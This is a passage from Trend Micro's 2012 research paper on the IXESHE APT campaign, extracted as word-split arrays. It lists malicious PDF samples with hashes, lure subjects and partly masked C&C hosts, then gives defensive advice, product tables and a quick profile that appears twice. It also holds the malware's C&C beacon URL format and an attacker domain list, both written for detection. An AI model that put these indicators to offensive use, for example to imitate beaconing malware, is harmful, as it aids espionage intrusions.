"July", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "\u7b2c\u4e94\u6b21\u6c5f\u9673\u6703\u8ac7\u6210\u679c\u8a18\u8005"], ["\u6703\u672c\u6703\u8cf4\u4e3b\u59d4\u8b1b\u8a71\u7a3f"], ["\u2022", "MD5:", "949265ee1d3e587152a23311a85b3be9"], ["\u2022", "C&C:", "xxx", ".", "xx.128.71"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/07/"], ["jul-01-cve-2009-4324-results-of-press", ".", "html"], ["\u2022", "Campaign", "code:", "ML0628"], ["PAGE", "13", "|", "IXESHE"], ["\u2022", "28", "July", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "Summary", "of", "Network"], ["Intelligence"], ["\u2022", "MD5:", "738af108a6edd46536492b1782589a04"], ["\u2022", "C&C:", "xxx", ".", "xx6.54.189"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/08/"], ["jul-28-cve-2009-4324-pdf-990729-romance", ".", "html"], ["\u2022", "Campaign", "code:", "[0713]"], ["\u2022", "16", "August", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "Communist", "China"], ["Removes", "Missiles"], ["\u2022", "MD5:", "6227e1594775773a182e1b631db5f6bb"], ["\u2022", "C&C:", "xxxxxck", ".", "dnsrd.com", "or", "xxx", ".", "xx6.34.94", "(appears"], ["to", "be", "a", "compromised", "computer", "of", "an", "East", "Asian"], ["university)"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/08/"], ["cve-2009-4324-cve-2010-1297-communist", ".", "html"], ["\u2022", "Campaign", "code:", "[0802]"], ["\u2022", "17", "August", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "36ee61663fc41496642850c4293fed01"], ["\u2022", "C&C:", "xxxxxck", ".", "dnsrd.com", "or", "xxx", ".", "xx6.34.94", "(appears"], ["to", "be", "a", "compromised", "computer", "of", "an", "East", "Asian"], ["university)"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=36ee61663fc41496642850c4293fed01"], ["\u2022", "Campaign", "code:", "[0802]"], ["\u2022", "27", "September", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "313158192d4442013f7bedeb9def01ec"], ["\u2022", "C&C:", "xx", ".", "xx.x3.102"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=313158192d4442013f7bedeb9def01ec"], ["\u2022", "Campaign", "code:", "[WH0827]"], ["\u2022", "22", "February", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "cd0eb6634ea684313389ddce553a6130"], ["\u2022", "C&C:", "xxx", ".", "xx.228.58"], ["\u2022", "Info:", "http://xml", ".", "ssdsandbox.net/view/"], ["cd0eb6634ea684313389ddce553a6130"], ["\u2022", "Campaign", "code:", "[0222]"], ["\u2022", "17", "March", "2011"], ["\u2022", "XLS", "name/Subject", "hook:", "Japan", "Nuclear", "Radiation"], ["Leakage", "and", "Vulnerability", "Analysis"], ["\u2022", "MD5:", "7ca4ab177f480503653702b33366111f"], ["\u2022", "C&C:", "xx", ".", "xxx.114.44"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/03/"], ["cve-2011-0609-adobe-flash-player", ".", "html"], ["\u2022", "Campaign", "code:", "OM222"], ["\u2022", "10", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "711542d883f8fca4aeac62ee1b7df6ca"], ["\u2022", "C&C:", "xx", ".", "xx.x0.244"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=711542d883f8fca4aeac62ee1b7df6ca"], ["\u2022", "Campaign", "code:", "[LY0406]"], ["\u2022", "20", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "China\u2019s", "Charm"], ["Diplomacy", "in", "BRICS", "Summit"], ["\u2022", "MD5:", "ae39b747e4fe72dce6e5cdc6d0314c02"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-20-cve-2011-0611-pdf-swf-chinas", ".", "html"], ["\u2022", "Campaign", "code:", "[Removed", "due", "to", "privacy"], ["concerns]"], ["\u2022", "20", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "The", "Obama"], ["Administration", "and", "the", "Middle", "East"], ["\u2022", "MD5:", "2368a8f55ee78d844896f05f94866b07"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-20-cve-2011-0611-pdf-swf-chinas", ".", "html"], ["\u2022", "Campaign", "code:", "{Removed", "due", "to", "privacy"], ["concerns]"], ["\u2022", "20", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "Russia\u2019s", "profit", "from"], ["general", "NATO", "disunity"], ["\u2022", "MD5:", "4065b98fdcb17a081759061306239c8b"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-20-cve-2011-0611-pdf-swf-chinas", ".", "html"], ["\u2022", "Campaign", "code:", "[Removed", "due", "to", "privacy"], ["concerns]"], ["\u2022", "22", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "Marshall", "Plan", "for", "the"], ["North", "Africa"], ["\u2022", "MD5:", "6d5fb801b890bfa7cc737c018e87e456"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-22-cve-2011-0611-pdf-swf-marshall", ".", "html"], ["\u2022", "Campaign", "code:", "[Removed", "due", "to", "privacy"], ["concerns]"], ["PAGE", "14", "|", "IXESHE"], ["\u2022", "28", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "14bf72167b4e801da205ecf9c0c55f9b"], ["\u2022", "C&C:", "xx", ".", "xx.x33.2"], ["\u2022", "Info:", "http://xml", ".", "ssdsandbox.net/view/14bf72167b4e"], ["801da205ecf9c0c55f9b"], ["\u2022", "Campaign", "code:", "[LY0420]"], ["\u2022", "1", "June", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "6ee4e08e6ab51208757fdc41d0e72846"], ["\u2022", "C&C:", "xxxxxain", ".", "qpoe.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=6ee4e08e6ab51208757fdc41d0e72846"], ["\u2022", "Campaign", "code:", "[LY]MAIL_20090923"], ["\u2022", "9", "June", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "10f193f825ada183fcfd067434ca269e"], ["\u2022", "C&C:", "xxxxxfo", ".", "AtHerSite.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=10f193f825ada183fcfd067434ca269e"], ["\u2022", "Campaign", "code:", "[LY]MAIL_20091208"], ["\u2022", "21", "September", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "32522cdc17a145486e26f35bdd524e7e"], ["\u2022", "C&C:", "xxx", ".", "xx0.139.67"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=32522cdc17a145486e26f35bdd524e7e"], ["\u2022", "Campaign", "code:", "[LY0816]"], ["\u2022", "12", "October", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "8718ab5c1683a69c4e6092fdcb32cfa2"], ["\u2022", "C&C:", "xxx", ".", "xx0.63.1"], ["\u2022", "Info:", "http://www", ".", "malware-control.com/statics-page"], ["s/8718ab5c1683a69c4e6092fdcb32cfa2", ".", "php"], ["\u2022", "Campaign", "code:", "[CZ0921]"], ["\u2022", "19", "October", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "80dad66d6224d18babd9ada4a26aee75"], ["\u2022", "C&C:", "xx", ".", "xxx.21.41", "or", "king", ".", "pirat3.com"], ["\u2022", "Info:", "http://xml", ".", "ssdsandbox.net/view/80dad66d62"], ["24d18babd9ada4a26aee75"], ["\u2022", "Campaign", "code:", "[WZ1011]"], ["\u2022", "26", "October", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "The", "Future", "Redefined"], ["2011", "AOEC", "CEO", "Summit"], ["\u2022", "MD5:", "3d91d9df315ffeb9bb1c774452b3114b"], ["\u2022", "C&C:", "xxx", ".", "xxawan.com", "or", "xxx", ".", "xx4.230.120"], ["\u2022", "Info:", "http://www", ".", "kahusecurity.com/2011/apecspearphish-2/"], ["\u2022", "Campaign", "code:", "19"], ["\u2022", "3", "November", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "E25DBA0556124D7874D8416DE291CFE2"], ["\u2022", "C&C:", "xxxxxfo", ".", "sdti.tw", "or", "xxx", ".", "xx2.246.110"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=e25dba0556124d7874d8416de291cfe2"], ["\u2022", "Campaign", "code:", "[CR1031]"], ["\u2022", "15", "November", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "829b78f1d1e74c2c5343a0aebb51f519"], ["\u2022", "C&C:", "xxxxxaga", ".", "chickenkiller.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=829b78f1d1e74c2c5343a0aebb51f519"], ["\u2022", "Campaign", "code:", "[TL1109]"], ["\u2022", "22", "November", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "c4a05230a898d91b30c88d52b3f069b3"], ["\u2022", "C&C:", "xxx", ".", "xx6.54.150", "or", "xxxxx", ".", "ItemDB.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=c4a05230a898d91b30c88d52b3f069b3"], ["\u2022", "Campaign", "code:", "[WH1122]"], ["PAGE", "15", "|", "IXESHE"], ["CONCLUSION"], ["The", "IXESHE", "campaign", "has", "been", "successfully", "executing"], ["targeted", "attacks", "since", "2009", ".", "The", "attackers", "primarily"], ["use", "malicious", "", ".", "PDF", "files", "that", "exploit", "vulnerabilities", "in"], ["Adobe", "Reader", ",", "Acrobat", ",", "and", "Flash", "Player", ",", "including", "the"], ["use", "of", "two", "zero-day", "exploits\u2014one", "in", "2009", "and", "another"], ["in", "2011", ".", "While", "the", "attackers", "primarily", "targeted", "East"], ["Asian", "governments", "in", "the", "past", ",", "they", "have", "also", "started"], ["targeting", "a", "telecommunications", "company", "and", "electronics"], ["manufacturers", ".", "They", "kept", "track", "of", "their", "targeted", "attacks"], ["by", "embedding", "a", "\u201ccampaign", "tag\u201d", "in", "the", "malware", "that"], ["appears", "to", "describe", "when", "each", "attack", "was", "launched", "and", ","], ["in", "some", "cases", ",", "the", "nature", "of", "its", "target", ".", "We", "found", "more"], ["than", "40", "of", "these", "campaign", "tags", "."], ["The", "IXESHE", "attackers", "are", "notable", "for", "their", "use", "of"], ["compromised", "machines", "within", "a", "target\u2019s", "internal", "network"], ["as", "C&C", "servers", ".", "This", "helped", "disguise", "their", "activities", ".", "In"], ["addition", ",", "the", "attackers\u2019", "use", "of", "the", "proxy", "tool", ",", "HTran", ",", "also"], ["helped", "mask", "their", "true", "location", ".", "While", "their", "identities"], ["remain", "unknown", ",", "the", "attackers", "behind", "the", "IXESHE"], ["campaign", "demonstrated", "that", "they", "were", "both", "determined"], ["and", "capable", ".", "While", "the", "malware", "used", "in", "the", "attacks"], ["were", "not", "very", "complicated", "by", "nature", ",", "these", "proved", "very"], ["effective", ".", "This", "campaign", "remains", "an", "active", "threat", "."], ["DEFENDING", "AGAINST", "APTS"], ["Sufficiently", "motivated", "threat", "actors", "can", "penetrate"], ["even", "networks", "that", "use", "moderately", "advanced", "security"], ["measures", ".", "As", "such", ",", "apart", "from", "standard", "and", "relevant"], ["attack", "prevention", "measures", "and", "mechanisms", "such", "as"], ["solid", "patch", "management;", "endpoint", "and", "network", "security;"], ["firewall", "use;", "and", "the", "like", ",", "enterprises", "should", "also", "focus"], ["on", "detecting", "and", "mitigating", "attacks", ".", "Moreover", ",", "data"], ["loss", "prevention", "(DLP)", "strategies", "that", "identify", "the", "data"], ["an", "organization", "is", "protecting", "and", "take", "into", "account", "the"], ["context", "of", "data", "use", "should", "be", "employed", "."], ["Local", "and", "External", "Threat", "Intelligence"], ["Threat", "intelligence", "refers", "to", "indicators", "that", "can", "be", "used"], ["to", "identify", "the", "tools", ",", "tactics", ",", "and", "procedures", "threat", "actors"], ["engaging", "in", "targeted", "attacks", "utilize", ".", "Both", "external", "and"], ["local", "threat", "intelligence", "is", "crucial", "for", "developing", "the"], ["ability", "to", "detect", "attacks", "early", ".", "The", "following", "are", "the", "core"], ["components", "of", "this", "defense", "strategy:"], ["\u2022", "Enhanced", "visibility:", "Logs", "from", "endpoint", ",", "server", ","], ["and", "network", "monitoring", "are", "an", "important", "and", "often"], ["underused", "resource", "that", "can", "be", "aggregated", "to", "provide"], ["a", "view", "of", "the", "activities", "within", "an", "organization", "that"], ["can", "be", "processed", "for", "anomalous", "behaviors", "that", "can"], ["indicate", "a", "targeted", "attack", "."], ["\u2022", "Integrity", "checks:", "In", "order", "to", "maintain", "persistence", ","], ["malware", "will", "make", "modifications", "to", "the", "file", "system", "and"], ["registry", ".", "Monitoring", "such", "changes", "can", "indicate", "the"], ["presence", "of", "malware", "."], ["\u2022", "Empowering", "the", "human", "analyst:", "Humans", "are", "best"], ["positioned", "to", "identify", "anomalous", "behaviors", "when"], ["presented", "with", "a", "view", "of", "aggregated", "logs", "from", "across"], ["a", "network", ".", "This", "information", "is", "used", "in", "conjunction", "with"], ["custom", "alerts", "based", "on", "the", "local", "and", "external", "threat"], ["intelligence", "available", "."], ["Technologies", "available", "today", "such", "as", "Deep", "Discovery"], ["provide", "visibility", ",", "insight", ",", "and", "control", "over", "networks", "to"], ["defend", "against", "targeted", "threats", ".", "11", "Deep", "Discovery", "uniquely"], ["detects", "and", "identifies", "evasive", "threats", "in", "real", "time", "and"], ["provides", "in-depth", "analysis", "and", "actionable", "intelligence", "to"], ["prevent", ",", "discover", ",", "and", "reduce", "risks", "."], ["11", "http://www", ".", "trendmicro.com/us/enterprise/security-risk-management/"], ["deep-discovery/index", ".", "html"], ["PAGE", "16", "|", "IXESHE"], ["Mitigation", "and", "Cleanup", "Strategy"], ["Once", "an", "attack", "is", "identified", ",", "the", "cleanup", "strategy", "should"], ["focus", "on", "the", "following", "objectives:"], ["\u2022", "Determine", "the", "attack", "vector", "and", "cut", "off"], ["communications", "with", "the", "C&C", "server", "."], ["\u2022", "Determine", "the", "scope", "of", "the", "compromise", "."], ["\u2022", "Assess", "the", "damage", "by", "analyzing", "the", "data", "and", "forensic"], ["artifacts", "available", "on", "compromised", "machines", "."], ["Remediation", "should", "be", "applied", "soon", "afterward", ",", "which"], ["includes", "steps", "to", "fortify", "affected", "servers", ",", "machines", ",", "or"], ["devices", "into", "secure", "states", ",", "informed", "in", "part", "by", "how", "the"], ["compromised", "machines", "were", "infiltrated", "."], ["Educating", "Employees", "Against", "Social"], ["Engineering"], ["Security-related", "policies", "and", "procedures", "combined", "with"], ["education", "and", "training", "programs", "are", "essential", "components"], ["of", "defense", ".", "Traditional", "training", "methods", "can", "be", "fortified"], ["by", "simulations", "and", "exercises", "using", "real", "spear-phishing"], ["attempts", "sent", "to", "test", "employees", ".", "Employees", "trained", "to"], ["expect", "targeted", "attacks", "are", "better", "positioned", "to", "report"], ["potential", "threats", "and", "constitute", "an", "important", "source", "of"], ["threat", "intelligence", "."], ["Data-Centric", "Protection", "Strategy"], ["The", "ultimate", "objective", "of", "targeted", "attacks", "is", "to", "acquire"], ["sensitive", "data", ".", "As", "such", ",", "DLP", "strategies", "that", "focus", "on"], ["identifying", "and", "protecting", "confidential", "information", "are"], ["critical", ".", "Enhanced", "data", "protection", "and", "visibility", "across"], ["an", "enterprise", "provides", "the", "ability", "to", "control", "access", "to"], ["sensitive", "data", "as", "well", "as", "monitor", "and", "log", "successful", "and"], ["unsuccessful", "attempts", "to", "access", "it", ".", "Enhanced", "access"], ["control", "and", "logging", "capabilities", "allow", "security", "analysts", "to"], ["locate", "and", "investigate", "anomalies", ",", "respond", "to", "incidents", ",", "and"], ["initiate", "remediation", "strategies", "and", "damage", "assessment", "."], ["PAGE", "17", "|", "IXESHE"], ["TREND", "MICRO", "THREAT", "PROTECTION", "AGAINST", "IXESHE", "CAMPAIGN"], ["COMPONENTS"], ["The", "following", "table", "summarizes", "the", "Trend", "Micro", "solutions", "for", "the", "components", "of", "the", "IXESHE", "campaign", ".", "Trend", "Micro"], ["recommends", "a", "comprehensive", "security", "risk", "management", "strategy", "that", "goes", "further", "than", "advanced", "protection", "to", "meet"], ["the", "real-time", "threat", "management", "requirements", "of", "dealing", "with", "targeted", "attacks", "."], ["Attack", "Component", "Protection", "Technology", "Trend", "Micro", "Solution"], ["Predetermined", "C&C", "communication"], ["format:"], ["http://[C&C", "Server]/"], ["[ACD]", "[EW]S[Some", "Numbers]", "."], ["jsp", "?", "[Encrypted", "Base64", "Blob]"], ["Web", "Reputation", "Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["InterScan", "Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["TROJ_PIDIEF", ",", "BKDR_PROXY", ",", "TROJ_"], ["DROPR", ",", "and", "TROJ_DEMTRANC", "variants"], ["File", "Reputation"], ["(Antivirus/Anti-malware)"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["InterScan", "Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["CVE-2009-4324"], ["CVE-2009-0927"], ["CVE-2011-0609"], ["CVE-2011-0611"], ["CVE-2009-3129"], ["Vulnerability", "Shielding/Virtual", "Patching", "Server", "(Deep", "Security)"], ["Endpoint", "(OfficeScan", "with", "Intrusion"], ["Defense", "Firewall", "Plug-In)"], ["For", "CVE-2009-4324:"], ["\u2022", "Rule", "#1004008", "(Adobe", "Reader", "and"], ["Acrobat", "\u2018newplayer()\u2019", "JavaScript"], ["Method", "Code", "Execution)"], ["For", "CVE-2009-0927:"], ["\u2022", "Rule", "#", "1003405", "(Adobe", "Acrobat"], ["JavaScript", "getIcon", "Method", "Buffer"], ["Overflow)"], ["For", "CVE-2011-0609:"], ["\u2022", "Rule", "#1004615", "(Adobe", "Flash", "Player"], ["XLS", "Remote", "Code", "Execution)"], ["For", "CVE-2011-0611:"], ["\u2022", "Rule", "#", "1004647", "(Restrict", "Microsoft"], ["Office", "File", "with", "Embedded", "SWF)"], ["For", "CVE-2009-3129:"], ["\u2022", "Rule", "#1003817", "(Excel", "Featheader"], ["Record", "Memory", "Corruption"], ["Vulnerability)"], ["PAGE", "18", "|", "IXESHE"], ["Attack", "Component", "Protection", "Technology", "Trend", "Micro", "Solution"], ["xxx", ".", "x.x87.206"], ["xxx", ".", "xx2.36.5"], ["xxx", ".", "xx6.129.228"], ["xxx", ".", "xx0.139.67"], ["xxx", ".", "xx.39.184"], ["xx", ".", "xxx.12.18"], ["xxx", ".", "xxrver.us"], ["xxx", ".", "xxt-alice.de"], ["xxxxxbaby", ".", "mooo.com"], ["xxxxxlic", ".", "yahoobigdeals.com"], ["xx", ".", "xx.x1.252"], ["xxx", ".", "xx.228.58"], ["xxx", ".", "xx.183.86"], ["xxx", ".", "xx.128.71"], ["xxx", ".", "xx.13.148"], ["xxx", ".", "xx5.243.44"], ["xxx", ".", "xx2.216.5"], ["xxx", ".", "xx.151.190"], ["xxx", ".", "xx.63.113"], ["xxx", ".", "xx.58.110"], ["xxx", ".", "xx.111.151"], ["xxx", ".", "xx6.54.150"], ["xxx", ".", "xx4.230.120"], ["xxx", ".", "xx0.139.67"], ["xxx", ".", "xx2.246.110"], ["xx", ".", "xxx.223.3"], ["xx", ".", "xx.x3.102"], ["xx", ".", "xx.x9.165"], ["xx", ".", "xx.x0.244"], ["xx", ".", "xx.x33.2"], ["xxxxxa", ".", "2waky.com"], ["xxx", ".", "xxawan.com"], ["xxxxxmic", ".", "dyndns-wiki.com"], ["xxxxxain", ".", "qpoe.com"], ["xxx", ".", "xxrver.us"], ["xxxxxfo", ".", "AtHerSite.com"], ["xxxxxem", ".", "passingg.as"], ["xxx", ".", "xxset.com"], ["xxxxx", ".", "dnset.com"], ["xxxx", ".", "xirat3.com"], ["xxxxxaga", ".", "chickenkiller.com"], ["xxxxx", ".", "otzo.com"], ["xxxxxck", ".", "dnsrd.com"], ["xxxxx", ".", "portrelay.com"], ["xxxxx", ".", "FindHere.org"], ["Web", ",", "Domain", ",", "and", "IP", "Reputation", "Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["InterScan", "Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["PAGE", "18", "|", "IXESHE"], ["May", "2012", "|", "APT", "Campaign", "Quick", "Profile:", "IXESHE"], ["Advanced", "persistent", "threats", "(APTs)", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific"], ["targets", "to", "maintain", "persistent", "presence", "within", "the", "victim\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because"], ["of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", ".", "Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card"], ["and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["IXESHE"], ["\u2022", "First", "Seen"], ["Individual", "targeted", "attacks", "are", "not", "one-off", "attempts", ".", "Attackers", "continually", "try", "to", "get", "inside", "the", "target\u2019s", "network", "."], ["The", "IXESHE", "campaign", "has", "been", "actively", "staging", "targeted", "attacks", "since", "at", "least", "July", "of", "2009", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["IXESHE", "has", "been", "found", "to", "target", "electronics", "manufacturers", ",", "a", "telecommunications", "company", ",", "and", "East", "Asian", "governments", "."], ["\u2022", "Operations"], ["First-stage", "computer", "intrusions", "often", "use", "social", "engineering", ".", "Attackers", "custom-fit", "attacks", "to", "their", "targets", "."], ["IXESHE", "attacks", "used", "custom-fit", "targeted", "emails", "with", "PDF", "exploits", "for", "CVE-2009-4324", ",", "CVE-2009-0927", ",", "CVE-2011-0609", ",", "and", "CVE-2011-0611", ".", "These"], ["were", "used", "to", "drop", "malicious", "executable", "files", "that", "gave", "the", "attackers", "complete", "control", "of", "their", "targets\u2019", "systems", "."], ["The", "attackers", "used", "either", "dynamic", "Domain", "Name", "System", "(DNS)", "or", "compromised", "servers", "hosted", "on", "networks", "that", "they", "previously", "successfully"], ["infiltrated", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise"], ["Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", ".", "A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["\u00bb", "Enters", "networks", "via", "a", "specially", "crafted", ",", "targeted", "email", "with", "a", "malicious", "file", "attachment"], ["\u00bb", "Uses", "document", "exploits", "(primarily", "PDF", "exploits)", "to", "drop", "malware", "onto", "target", "systems"], ["\u00bb", "Uses", "malware", "detected", "as", "IXESHE", "by", "security", "companies"], ["\u00bb", "Sends", "a", "GET", "request", "to", "the", "command-and-control", "(C&C)", "server", "with", "the", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some", "Numbers]", ".", "jsp?[Encrypted", "Base64", "Blob]"], ["*", "The", "campaign", "codes", "we", "have", "seen", "so", "far", "are", "detailed", "in", "the", "Trend", "Micro", "research", "paper", ",", "\u201cIXESHE:", "An", "APT", "Campaign", ".", "\u201d", "The", "characteristics"], ["highlighted", "in", "this", "APT", "campaign", "quick", "profile", "reflect", "the", "results", "of", "our", "investigation", "as", "of", "May", "2012", "."], ["May", "2012", "|", "APT", "Campaign", "Quick", "Profile:", "IXESHE"], ["Advanced", "persistent", "threats", "(APTs)", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific"], ["targets", "to", "maintain", "persistent", "presence", "within", "the", "victim\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because"], ["of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", ".", "Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card"], ["and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["IXESHE"], ["\u2022", "First", "Seen"], ["Individual", "targeted", "attacks", "are", "not", "one-off", "attempts", ".", "Attackers", "continually", "try", "to", "get", "inside", "the", "target\u2019s", "network", "."], ["The", "IXESHE", "campaign", "has", "been", "actively", "staging", "targeted", "attacks", "since", "at", "least", "July", "of", "2009", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["IXESHE", "has", "been", "found", "to", "target", "electronics", "manufacturers", ",", "a", "German", "telecommunications", "company", ",", "and", "East", "Asian", "governments", "."], ["\u2022", "Operations"], ["First-stage", "computer", "intrusions", "often", "use", "social", "engineering", ".", "Attackers", "custom-fit", "attacks", "to", "their", "targets", "."], ["IXESHE", "attacks", "used", "custom-fit", "targeted", "emails", "with", "PDF", "exploits", "for", "CVE-2009-4324", ",", "CVE-2009-0927", ",", "CVE-2011-0609", ",", "and", "CVE-2011-0611", ".", "These"], ["were", "used", "to", "drop", "malicious", "executable", "files", "that", "gave", "the", "attackers", "complete", "control", "of", "their", "targets\u2019", "systems", "."], ["The", "attackers", "used", "either", "dynamic", "Domain", "Name", "System", "(DNS)", "or", "compromised", "servers", "hosted", "on", "networks", "that", "they", "previously", "successfully"], ["infiltrated", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise"], ["Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", ".", "A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["\u00bb", "Enters", "networks", "via", "a", "specially", "crafted", ",", "targeted", "email", "with", "a", "malicious", "file", "attachment"], ["\u00bb", "Uses", "document", "exploits", "(primarily", "PDF", "exploits)", "to", "drop", "malware", "onto", "target", "systems"], ["\u00bb", "Uses", "malware", "detected", "as", "IXESHE", "by", "security", "companies"], ["\u00bb", "Sends", "a", "GET", "request", "to", "the", "command-and-control", "(C&C)", "server", "with", "the", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some", "Numbers]", ".", "jsp?[Encrypted", "Base64", "Blob]"], ["*", "The", "campaign", "codes", "we", "have", "seen", "so", "far", "are", "detailed", "in", "the", "Trend", "Micro", "research", "paper", ",", "\u201cIXESHE:", "An", "APT", "Campaign", ".", "\u201d", "The", "characteristics"], ["highlighted", "in", "this", "APT", "campaign", "quick", "profile", "reflect", "the", "results", "of", "our", "investigation", "as", "of", "May", "2012", "."], ["PAGE", "19", "|", "IXESHE"], ["\u00a92012", "by", "Trend", "Micro", ",", "Incorporated", ".", "All", "rights", "reserved", ".", "Trend", "Micro", "and", "the", "Trend", "Micro", "t-ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", ".", "All", "other", "product", "or", "company"], ["names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["TREND", "MICRO\u2122"], ["Trend", "Micro", "Incorporated", "(TYO:", "4704;", "TSE:", "4704)", ",", "a", "global", "cloud", "security"], ["leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses"], ["and", "consumers", ".", "A", "pioneer", "in", "server", "security", "with", "over"], ["20", "years\u2019", "experience", ",", "we", "deliver", "top-ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers\u2019", "and", "partners\u2019", "needs", ",", "stops"], ["new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud"], ["environments", ".", "Powered", "by", "the", "industry-leading", "Trend", "Micro\u2122", "Smart", "Protection", "Network\u2122", "cloud", "computing", "security", "infrastructure", ",", 